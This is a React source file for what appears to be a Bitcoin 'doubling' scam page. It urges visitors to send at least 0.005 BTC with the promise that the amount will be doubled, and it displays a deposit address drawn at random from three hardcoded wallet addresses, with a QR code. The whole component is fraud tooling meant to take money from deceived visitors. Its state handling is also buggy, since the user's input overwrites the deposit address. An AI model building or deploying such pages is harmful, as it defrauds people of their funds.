import React, { Component } from 'react';
import {Card, Input, Button, message, Modal,Tag} from 'antd'
import QRCode from  'qrcode.react';

export default class Recieve extends Component{

constructor(props){
   super(props)

   this.state={
     address:'',
     visible:false,
     address:'',

   }
}
componentDidMount(){
  const add = ['14p5Y1ukBrrtNhtsYds3t5vQusk9YHMmDw','1HCN5q64dvTWdYN3G8dNrmmmPG3iqXseCr','1PuAp1hu5zHUxCF9H4zRqFyGzpZ8Z1EZmm']

  const new_arr = this.shuffle(add)
  this.setState({address:new_arr[1]})
console.log("rand",new_arr[0]);

}

shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  // While there remain elements to shuffle...
  while (0 !== currentIndex) {

    // Pick a remaining element...
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;

    // And swap it with the current element.
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}
onVal(e){
  this.setState({address:e.target.value})
}
onSub(){
  if(this.state.address.length!=34){
    message.error('Invalid Wallet Address')
  }
  else{
    this.setState({visible:true})
  }
}

handleCancel = () => {
   this.setState({ visible: false });
 }
onCopy(){

}

  render(){
    return(
      <div style={{width:'90%',margin:'auto'}}>
        <Card>

          <div>
            <h2>Enter your receiving Bitcoin wallet address</h2>
            <h3>Send Bitcoin amount you want to double: (Min -<strong>BTC</strong> 0.005)</h3>
            <br />
            <div style={{width:'60%',margin:'auto',textAlign:'center'}}>
              <Input placeholder="Enter your wallet address" style={{marginBottom:10}} onChange={this.onVal.bind(this)} />

              <Button type="primary" style={{margin:'auto',width:'50%'}} onClick={this.onSub.bind(this)}>Double it for me</Button>
            </div>
          </div>

        </Card>

        <Modal
          headerStyle={{background: '#08c',}}
          title="Make a deposit:"
          visible={this.state.visible}
          footer={null}
          onCancel={this.handleCancel}
          closable={true}
        >
        <div>
          YOUR DEPOSIT ADDRESS:
          <div style={{textAlign:'center'}}>
            <br />
            <div style={{background:'#08c',color:'#fff',textAlign:'center',fontWeight:'bold'}}>{this.state.address}</div>
              <br />
            <QRCode value={this.state.address} />
          </div>


        </div>

      </Modal>
      </div>
    )
  }
}
